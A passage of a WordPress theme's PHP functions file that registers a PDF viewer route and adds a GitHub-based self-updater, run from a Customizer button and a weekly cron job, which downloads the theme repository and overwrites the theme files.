						wp_set_post_terms( $post_id, array( (int) $term_id ), 'categoria-libro' );
					}
				}
			}
		}
	}
}
add_action( 'init', 'fcb_seed_test_books' );

/**
 * Registro de reglas de reescritura para el visor virtual de PDF.
 */
function fcb_pdf_viewer_rewrite_rule() {
	add_rewrite_rule( '^visor-pdf/?$', 'index.php?fcb_pdf_viewer=1', 'top' );
}
add_action( 'init', 'fcb_pdf_viewer_rewrite_rule' );

function fcb_pdf_viewer_query_vars( $vars ) {
	$vars[] = 'fcb_pdf_viewer';
	return $vars;
}
add_filter( 'query_vars', 'fcb_pdf_viewer_query_vars' );

function fcb_pdf_viewer_template_redirect() {
	if ( get_query_var( 'fcb_pdf_viewer' ) ) {
		include get_template_directory() . '/template-pdf-viewer.php';
		exit;
	}
}
add_action( 'template_redirect', 'fcb_pdf_viewer_template_redirect' );

/**
 * Forzar la recarga de reglas de reescritura en activación del tema.
 */
function fcb_flush_rewrite_rules_on_switch() {
	flush_rewrite_rules();
}
add_action( 'after_switch_theme', 'fcb_flush_rewrite_rules_on_switch' );

/**
 * Clase para el control personalizado de botón de actualización desde GitHub.
 */
if ( class_exists( 'WP_Customize_Control' ) ) {
	class FCB_Customize_Update_Control extends WP_Customize_Control {
		public $type = 'github_update_button';

		public function render_content() {
			?>
			<span class="customize-control-title"><?php esc_html_e( 'Actualizar Tema desde GitHub', 'fcb' ); ?></span>
			<span class="description customize-control-description">
				<?php esc_html_e( 'Haz clic para buscar, descargar y auto-aplicar la versión más reciente del repositorio de GitHub.', 'fcb' ); ?>
			</span>
			<button type="button" class="button button-primary" id="fcb-github-update-btn" style="margin-top: 10px; width: 100%;">
				<?php esc_html_e( 'Buscar actualizaciones', 'fcb' ); ?>
			</button>
			<div id="fcb-update-status" style="margin-top: 10px; font-weight: bold; font-size: 11px; line-height: 1.4;"></div>

			<script type="text/javascript">
			jQuery(document).ready(function($) {
				$('#fcb-github-update-btn').on('click', function(e) {
					e.preventDefault();
					var $btn = $('#fcb-github-update-btn');
					var $status = $('#fcb-update-status');

					if ($btn.hasClass('disabled')) {
						return;
					}

					$btn.addClass('disabled').text('<?php esc_html_e( 'Actualizando...', 'fcb' ); ?>');
					$status.css('color', '#666').text('<?php esc_html_e( 'Conectando con GitHub y descargando archivos...', 'fcb' ); ?>');

					$.post(ajaxurl, {
						action: 'fcb_trigger_github_update',
						nonce: '<?php echo wp_create_nonce( "fcb_github_update_nonce" ); ?>'
					}, function(response) {
						$btn.removeClass('disabled').text('<?php esc_html_e( 'Buscar actualizaciones', 'fcb' ); ?>');
						if (response.success) {
							$status.css('color', '#0e943f').text(response.data);
							setTimeout(function() {
								window.parent.location.reload();
							}, 2000);
						} else {
							$status.css('color', '#dc3232').text(response.data);
						}
					}).fail(function() {
						$btn.removeClass('disabled').text('<?php esc_html_e( 'Buscar actualizaciones', 'fcb' ); ?>');
						$status.css('color', '#dc3232').text('<?php esc_html_e( 'Error de red al actualizar.', 'fcb' ); ?>');
					});
				});
			});
			</script>
			<?php
		}
	}
}

/**
 * AJAX Handler para actualización manual de GitHub.
 */
function fcb_trigger_github_update_ajax() {
	check_ajax_referer( 'fcb_github_update_nonce', 'nonce' );

	if ( ! current_user_can( 'update_themes' ) ) {
		wp_send_json_error( __( 'Permisos insuficientes.', 'fcb' ) );
	}

	$result = fcb_execute_silent_update();

	if ( is_wp_error( $result ) ) {
		wp_send_json_error( $result->get_error_message() );
	}

	wp_send_json_success( __( '¡Tema actualizado con éxito! Recargando panel...', 'fcb' ) );
}
add_action( 'wp_ajax_fcb_trigger_github_update', 'fcb_trigger_github_update_ajax' );

/**
 * Ejecutar la descarga y sobreescritura de actualización de forma silenciosa.
 */
function fcb_execute_silent_update() {
	$repo_owner = 'jaimegh-es';
	$repo_name  = 'fundacionconradoblanco';
	$branch     = 'main';
	
	$token = get_theme_mod( 'fcb_github_token', '' );
	$url   = "https://api.github.com/repos/{$repo_owner}/{$repo_name}/zipball/{$branch}";

	$args = array(
		'timeout' => 120,
		'headers' => array(
			'User-Agent' => 'WordPress-Theme-Updater',
			'Accept'     => 'application/vnd.github.v3+json',
		),
	);

	if ( ! empty( $token ) ) {
		$args['headers']['Authorization'] = 'token ' . $token;
	}

	$response = wp_remote_get( $url, $args );

	if ( is_wp_error( $response ) ) {
		return $response;
	}

	$code = wp_remote_retrieve_response_code( $response );
	if ( $code !== 200 ) {
		return new WP_Error( 'http_error', sprintf( __( 'Error HTTP %d de GitHub. Verifica la conexión o el token.', 'fcb' ), $code ) );
	}

	$body = wp_remote_retrieve_body( $response );
	if ( empty( $body ) ) {
		return new WP_Error( 'empty_body', __( 'El archivo zip de actualización está vacío.', 'fcb' ) );
	}

	// Guardar temporalmente
	$temp_zip = wp_tempnam( 'theme_update_' );
	global $wp_filesystem;
	if ( empty( $wp_filesystem ) ) {
		require_once( ABSPATH . 'wp-admin/includes/file.php' );
		WP_Filesystem();
	}

	if ( ! $wp_filesystem->put_contents( $temp_zip, $body ) ) {
		return new WP_Error( 'write_error', __( 'No se pudo escribir el archivo zip temporal.', 'fcb' ) );
	}

	// Carpeta de extracción
	$temp_extract = get_temp_dir() . 'fcb_update_extract_' . time() . '/';
	wp_mkdir_p( $temp_extract );

	// Descomprimir
	$unzip_status = unzip_file( $temp_zip, $temp_extract );
	@unlink( $temp_zip );

	if ( is_wp_error( $unzip_status ) ) {
		$wp_filesystem->delete( $temp_extract, true );
		return $unzip_status;
	}

	// Buscar subdirectorio
	$subdirs = glob( $temp_extract . '*', GLOB_ONLYDIR );
	if ( empty( $subdirs ) ) {
		$wp_filesystem->delete( $temp_extract, true );
		return new WP_Error( 'invalid_zip', __( 'Estructura de zip de GitHub inválida.', 'fcb' ) );
	}

	$source_dir = $subdirs[0] . '/';
	$theme_dir  = get_template_directory() . '/';

	// Copiar archivos recursivamente
	$copy_status = copy_dir( $source_dir, $theme_dir );
	
	// Limpieza
	$wp_filesystem->delete( $temp_extract, true );

	if ( is_wp_error( $copy_status ) ) {
		return $copy_status;
	}

	return true;
}

/**
 * Planificación de Cron Semanal para Actualización Automática.
 */
function fcb_schedule_weekly_update() {
	if ( ! wp_next_scheduled( 'fcb_weekly_github_update' ) ) {
		wp_schedule_event( time(), 'weekly', 'fcb_weekly_github_update' );
	}
}
add_action( 'wp', 'fcb_schedule_weekly_update' );

function fcb_run_weekly_github_update() {
	// Ejecutar la actualización en segundo plano
	fcb_execute_silent_update();
}
add_action( 'fcb_weekly_github_update', 'fcb_run_weekly_github_update' );


